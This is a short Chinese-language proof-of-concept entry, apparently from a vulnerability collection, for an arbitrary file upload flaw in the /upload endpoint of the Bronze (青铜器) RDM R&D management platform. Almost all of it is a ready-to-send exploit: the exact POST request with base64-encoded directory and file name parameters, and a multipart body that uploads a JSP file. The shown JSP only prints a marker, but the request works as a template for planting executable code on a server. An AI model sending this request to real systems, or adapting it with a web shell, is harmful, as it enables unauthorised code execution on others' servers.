# 青铜器RDM研发管理平台upload存在任意文件上传漏洞

青铜器RDM研发管理平台 ｜ 文件上传 ｜ —
- **请求**：`POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1`

**Payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="poc.jsp"
Content-Type: application/octet-stream
<%out.println("1234");%>
--00content0boundary00
Content-Disposition: form-data; name="Submit"
Go
--00content0boundary00--
```